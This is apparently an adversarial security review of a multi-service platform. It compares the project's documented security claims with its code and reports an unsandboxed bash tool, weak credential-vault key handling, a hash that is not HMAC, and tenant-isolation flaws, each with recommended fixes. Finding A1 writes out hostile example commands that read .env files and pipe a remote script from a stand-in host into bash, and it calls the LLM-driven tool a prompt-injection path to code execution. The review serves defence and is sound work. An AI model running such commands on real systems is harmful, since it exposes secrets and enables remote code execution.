# Adversarial Analysis — Symbia Stack (full scope)

*Prepared 13 August 2026, against the working tree on disk. Every claim below cites
`file:line`. This is a red-team read: it privileges what is broken, overstated, or
dangerous over what works. A fair accounting of what works is in the last section —
read that too, because it changes how you should weight the rest.*

**Ground rule I adopted:** I trust the code over any document, and I trust
`STATUS.md` over the outward docs (`README.md`, `INTENT.md`, `SECURITY.md`). Where
the two disagree, that gap is itself a finding.

---

## The one-paragraph verdict

This is a serious, self-aware codebase with an unusually honest internal ledger
(`STATUS.md`) — and an outward documentation layer that promises a security posture
the code does not implement. The three load-bearing security claims on the front
door — **"HMAC-SHA256 event integrity," "AES-256-GCM credential vault," and
"sandboxed" code/bash execution** — are each materially weaker in code than in prose.
The multi-tenant isolation story, sound on paper and correct in the shared library,
is wired into the services through the one entry point the library explicitly warns
against. None of this is fraud; most of it is a young platform that documented its
intent and shipped its scaffolding, and the two drifted. But if someone deployed
this on the strength of `README.md`/`SECURITY.md` today, they would be materially
misled about four things that matter.

---

## A. Security findings (verified in code), ranked

### A1 — "Sandboxed" code tools are unsandboxed host command execution — CRITICAL

`README.md:264` and `INTENT.md:309` advertise *"Code Tools: File operations, bash
execution, search within **sandboxed** workspaces."* The implementation is
`assistants/server/src/engine/actions/code-tool-invoke.ts`.

- `executeBash` (line 376) runs `spawn('bash', ['-c', command], { cwd })` — a raw
  shell on the assistants **service process itself**: same UID, same container
  filesystem, same network, and the same environment that holds `SESSION_SECRET`,
  `CREDENTIAL_ENCRYPTION_KEY`, and `DATABASE_URL`. There is no namespace, no seccomp,
  no container boundary, no allowlist. The "sandbox" is a `cwd` string plus a
  `startsWith` path check (line 389) — and a `cwd` does not confine a shell.
  `cat ../../.env`, `env`, `curl evil/x | bash` all run.
- The handler is **registered and reachable**: `engine/actions/index.ts:47-48`
  wires `CodeToolInvokeHandler` and `WorkspaceCreateHandler` into the action
  registry, and `code.tool.invoke` / `workspace.create` are declared action types
  (`engine/types.ts:34-35`). Any assistant graph or rule can invoke it. The input
  is, by design, LLM-influenced — this is prompt-injection-to-RCE by construction.
- The declared guardrails are dead code. `WorkspaceCreateHandler` (line 448) accepts
  an arbitrary caller-supplied `rootPath` (line 465) and caller-supplied
  `permissions` including `execute` (line 479, `...params.permissions`). So a caller
  can create a workspace rooted at `/` with `execute: true`. Worse, the
  `blockedPaths: ['**/.env*', '**/secrets/**']` and `permissions.paths` fields
  (lines 477-478) are **never read by any tool** — grep confirms only the definition
  and the default appear; nothing enforces them. The one control specifically aimed
  at protecting `.env` does nothing.
- The path check is the weaker `startsWith(rootPath)` form (lines 134, 166, 389)
  with no `path.sep` boundary and no `realpath`, so a sibling-prefix directory or an
  in-workspace symlink escapes it.

`STATUS.md` never claims this is sandboxed — but `README.md` and `INTENT.md` do, and
they are what a reader sees first. **Recommendation:** either move execution behind a
real isolation boundary (gVisor/Firecracker/container-per-workspace, dropped caps,
no host env) or delete the `bash`/`execute` tool and stop calling it sandboxed.

### A2 — Credential vault: hardcoded fallback key, no KDF, no prod guard — HIGH

`README.md:258` and `INTENT.md:262` sell *"Credential Vault: AES-256-GCM encrypted
storage for secrets."* GCM with a random IV and stored auth tag is used correctly
(`identity/server/src/routes.ts:3136-3141`). The key management around it is not:

- **Hardcoded fallback key**, at four call sites:
  `const encryptionKey = process.env.CREDENTIAL_ENCRYPTION_KEY || process.env.JWT_SECRET || "dev-secret-key-32chars-minimum!!"`
  (`routes.ts:3135, 3298, 3363, 3457`, and again in `index.ts:31`, `seed.ts:40`).
  Unlike `SESSION_SECRET` (`routes.ts:57` throws if unset) and `NETWORK_HASH_SECRET`
  (`network/.../policy.ts:24` throws in prod), the vault key has **no production
  guard**. Ship without setting the env var and every "encrypted" secret is
  encrypted under a key printed in this repo.
- **No key derivation.** The key is `Buffer.from(encryptionKey.padEnd(32).slice(0,32))`
  (`routes.ts:3137`) — the raw string, space-padded/truncated to 32 bytes, used
  directly as the AES-256 key. A short operator secret becomes a low-entropy key with
  trailing spaces. There is no scrypt/PBKDF2/HKDF despite `INTENT.md` listing them
  as available.
- **Secret coupling.** Falling back to `JWT_SECRET` for encryption means rotating the
  JWT secret silently makes all stored credentials undecryptable, and a leak of
  either secret leaks both domains.
- **Copy-pasted crypto.** The same encrypt/decrypt block is inlined at 5+ sites
  rather than living in `@symbia/crypto`. This is exactly the "forked concern / two
  sources of truth" defect the project names elsewhere (`STATUS.md:366`); a fix to
  one site will silently not reach the others.

### A3 — "HMAC-SHA256" event integrity is not HMAC — HIGH (integrity) / correctness

The docs claim HMAC in at least six places: `SECURITY.md:124`, `README.md:283/351`,
`network/README.md:508`, `network/docs/architecture.md:67`, and `network/INTENT.md`
which even carries a section titled *"Why HMAC over plain SHA256"* (lines 541-556)
with the formula `HMAC-SHA256(secret, …)` (line 256).

The code (`network/server/src/services/policy.ts:50-53`) is:

```js
createHash('sha256').update(hashInput).update(hashSecret).digest('hex')
```

That is `SHA256(data ‖ secret)` — a secret-**suffix** construction, **not HMAC**.
It imports `createHash`, never `createHmac`. Consequences:

- The construction is non-standard and weaker than HMAC (the project's *own* finding
  doc already says so for the sibling provenance envelope:
  `docs/2026-08-10-provenance-envelope-shared-secret.md:42` — *"sha256(data ‖ secret)
  is a non-standard construction. HMAC is the [right one]"*). The team diagnosed this
  for one path and shipped the same flaw on another while the docs still say HMAC.
- **Non-constant-time verification:** `event.hash === expectedHash`
  (`policy.ts:62`) is a short-circuiting string compare — a timing side channel on a
  MAC check. Use `crypto.timingSafeEqual`.
- **Public dev fallback secret:** `hashSecret = HASH_SECRET || 'symbia-network-dev-only'`
  (`policy.ts:27`), and the throw only fires when `NODE_ENV === 'production'`
  (line 24). Any non-prod deployment verifies "integrity" against a secret printed in
  the repo — i.e., no integrity.
- Even the documented *input* is wrong: `network/INTENT.md:256` hashes
  `payload + source + timestamp`; the code hashes
  `{type, data, source, runId, boundary, target}` (`policy.ts:41-48`) — no timestamp,
  so the "tamper-evidence" does not cover replay-relevant fields it claims to.

### A4 — Tenant isolation: `X-Org-Id` is trusted, and RLS is wired through the wrong door — HIGH

`INTENT.md:196-211` promises multi-tenancy "not an afterthought," with "automatic
scoping." Two verified problems undercut it:

1. **Client-chosen org, no membership check.** In
   `assistants/server/src/middleware/auth.ts:108-119`, the org is taken from the
   `X-Org-Id` header *in preference to* the token, and there is no check that the
   authenticated principal belongs to that org before it becomes the RLS context
   (`auth.ts:142-147`). An authenticated user in org A can send `X-Org-Id: <org B>`
   and have the request run in org B's scope. The header is also accepted from query
   string and body in the route helpers (`routes/runs.ts:17`, `routes/graphs.ts:18`).

2. **RLS set on the pool, not a pinned client.** `@symbia/db`'s own doc comment is
   explicit: *"Uses SET LOCAL so the settings only apply to the current transaction.
   For connection pooling, wrap queries in a transaction or use a dedicated client."*
   (`symbia-db/src/rls.ts:97-98`), and it ships the correct primitive
   `withRLSContext` (line 152: `connect → BEGIN → setSessionContext → fn → COMMIT`).
   But the services don't use it. `identity/server/src/db.ts:66` and the assistants
   middleware call `setRLSContext` **on the pool** with `set_config(..., is_local=true)`
   (`rls.ts:111-122`) — a transaction-local setting with no open transaction. The
   connection returns to the pool and the subsequent route query may run on a
   different backend with empty context. Depending on which policy variant a table
   uses (`rls.ts:196-197` offers both `org_id IS NULL OR …` — **fail-open** — and a
   strict form), the result is either silent no-filtering or filtering on an empty
   org. Either way the "automatic scoping" guarantee is not reliably in force at
   runtime.

3. **Fail-open on error.** `auth.ts:148-151` catches an RLS-context failure and
   *"Continue[s] without RLS"*. With pooling, "without RLS" can mean "with the
   previous request's context." A MAC/isolation control that proceeds when it fails
   is the wrong default.

*Credit where due:* real Postgres RLS policies exist (`*/migrations/0001_rls_policies.sql`
across six services) and the library design is correct. The failure is integration,
not absence — but integration is what runs in production.

### A5 — Dev-mode security divergence is invisible — MEDIUM

The "same code, two backends" claim (`INTENT.md:219-235`) hides that the two backends
have **different security behavior**: `pg-mem` does not implement Postgres RLS, so
every `*_USE_MEMORY_DB=true` path — the documented default dev/test mode
(`README.md:367`) — runs with **no row-level tenant isolation at all**. Combined with
A4, a developer's mental model ("multi-tenancy is automatic") is formed in exactly the
mode where it is absent. `DEV_NO_AUTH` (`identity/.../routes.ts:154`) and the
console's `?debug` auto-login as `dev@example.com`
(`symbia-control-center/src/hooks/useAuth.ts:53-71`, `config/debug.ts:26`) compound
this: several "off by default" switches are one URL param or one env var from
attaching requests to a real privileged user.

---

## B. Documentation vs. reality — the honesty gap

The project effectively maintains **two documentation universes**, and they
contradict each other:

- **Confessional** — `STATUS.md` and the dated `docs/*.md`. These are excellent:
  three-state labeling (RUNS / BUILT-UNWIRED / PAPER), evidence named, defects ranked,
  even the file's own past lies corrected in place (`STATUS.md:320, 415`). This is
  some of the most intellectually honest engineering documentation I have read.
- **Aspirational front door** — `README.md`, `INTENT.md`, `SECURITY.md`. These state
  capabilities in the present indicative that the code does not back:
  "HMAC-SHA256" (A3), "AES-256-GCM encrypted vault" as a finished control (A2),
  "sandboxed" execution (A1), "automatic scoping" (A4).

The adversarial point is not that either universe is wrong — it's that a reader is
told to *"Read this before anything else"* only inside `STATUS.md:8`. Anyone arriving
via GitHub reads `README`/`SECURITY` first and forms a false picture. Concrete
smaller drifts:

- `SECURITY.md:14` security contact is `hello@example.com`; `SECURITY.md:5-8` claims
  "1.x supported" while `STATUS.md:322` notes every tagged release (v1.0.0–v1.2.0)
  *predates the current rebuild* and `main` is 69 commits behind the work branch. The
  supported-version table describes software that no longer matches the tree.
- `README.md:283/351` and the architecture diagrams present the SDN integrity and
  contract enforcement as active platform guarantees; `STATUS.md:144-158` shows most
  of that surface (`assistant.route`, `handoff.*`, `condition`, `parallel`, `loop`)
  had **no caller at all** until 11 Aug, and wiring three assistants surfaced twelve
  latent defects (`STATUS.md:196`) — the platform's own evidence that the documented
  capabilities were largely untested scaffolding.
- `INTENT.md:519` ("No Guaranteed Exactly-Once Delivery") is honest; but the same doc
  presents provenance/lineage as a shipped spine, while `STATUS.md:108-113` records
  the lineage chain heads are **in memory**, so a restart re-links a conversation to
  GENESIS — the provenance chain, the headline trust feature, does not survive a
  process bounce.

**Cheapest high-value fix in the whole review:** make `README.md`/`SECURITY.md` tell
the truth `STATUS.md` already tells — downgrade "HMAC," "vault," "sandboxed," and
"automatic scoping" to their real state, or link the front door to `STATUS.md` at the
top.

---

## C. Architecture & viability critique

- **In-memory state is load-bearing and undermines the value proposition.** Lineage
  chain heads (`STATUS.md:108`), rule state (`STATUS.md:201`), network policies
  (`network/.../policy.ts:20`), and code-tool workspaces
  (`code-tool-invoke.ts:41`) are all in-memory "by ruling." That is a defensible MVP
  stance for rules — but for a platform whose *entire pitch* is provenance,
  auditability, and "trace exactly what happened," non-durable provenance is a
  contradiction, not a deferral. A crash loses the audit chain the product exists to
  provide.
- **The build gate is off.** `STATUS.md:262`: `npm run check` fails with 159
  TypeScript errors (19 in assistants alone). A type-checked codebase that does not
  type-check has no compile-time contract; every refactor is unguarded.
- **No resilience to its own datastore.** `STATUS.md:265`: no service survives a
  Postgres restart — four crash on an unhandled `error` event with no reconnect and
  no restart policy. For "infrastructure," single-dependency fragility with no
  supervision is a production blocker, not a bug.
- **Two conflicting seed paths, and no file→DB path.** `STATUS.md:205-224`: editing a
  bootstrap JSON never reaches the DB, `seedFromDataFiles()` is all-or-nothing (and
  is nothing, because `markBootstrapCompleted()` sits after the throwing insert), and
  `npm run seed` (`catalog/.../seed.ts`) *deletes then reloads only the snapshot* —
  running it silently reverts the working roster. This is the most dangerous
  operational footgun in the repo and the project agrees (`STATUS.md:343`).
- **Bus factor.** `STATUS.md:326`: 47 commits unpushed, "today's work exists on one
  laptop"; 176 commits ahead of `main`. The canonical branch is not the real system.
- **Scope vs. wiring ratio.** 616 source files, ~138k lines, twelve services — yet the
  demonstrated end-to-end capability is "three assistants route a unit-conversion
  message" (`STATUS.md:160-201`). The ambition-to-proven-behavior ratio is very high;
  most of the surface is BUILT-UNWIRED by the project's own labeling. For viability,
  that means the maintenance burden of a large platform with the validated behavior of
  a prototype.

---

## What is genuinely strong (so the above is weighted fairly)

- `STATUS.md` and the dated `docs/` are a model of honest engineering: falsifiable
  claims, named evidence, self-correction. Most projects would kill for this ledger.
- The `@symbia/db` RLS library is designed correctly (`withRLSContext`), with real
  Postgres policies behind it — the gap is call-site discipline, which is fixable
  without redesign.
- Auth *primitives* are careful: `SESSION_SECRET` refuses to default (`routes.ts:57`),
  JWT verify fails closed (`routes.ts:119-130`), CORS reflects a specific origin under
  credentials rather than `*` (`symbia-http/src/cors.ts:143-153`), and the "no default
  credentials / interactive super-admin" first-run story is real.
- The `check:ports` invariant and the "not `docker-compose.override.yml` on purpose"
  reasoning (`README.md:128-131`) show a genuine instinct for making defaults *facts*
  rather than *claims*. That instinct just hasn't reached the security prose yet.

---

## If I could fix five things, in order

1. **A1** — put code/bash execution behind a real isolation boundary or remove it and
   stop calling it sandboxed. This is the only finding that is remote-code-execution
   shaped.
2. **A4** — validate `X-Org-Id` against membership, and route every request's queries
   through `withRLSContext` (pinned client + transaction). Remove the "continue
   without RLS" fail-open.
3. **A2/A3** — centralize crypto in `@symbia/crypto`: real HMAC (`createHmac`) +
   `timingSafeEqual` for the network hash; real KDF + a production guard (throw when
   unset) for the vault; delete the hardcoded fallback key.
4. **B** — reconcile the front-door docs with `STATUS.md`. Downgrade the four
   overstated security claims to their true state or link `STATUS.md` from the top of
   `README.md`.
5. **C** — turn the build gate back on (triage the 159 TS errors) and add a Postgres
   reconnect/restart policy. Until `npm run check` passes and services survive their
   own database, "infrastructure" is aspirational.
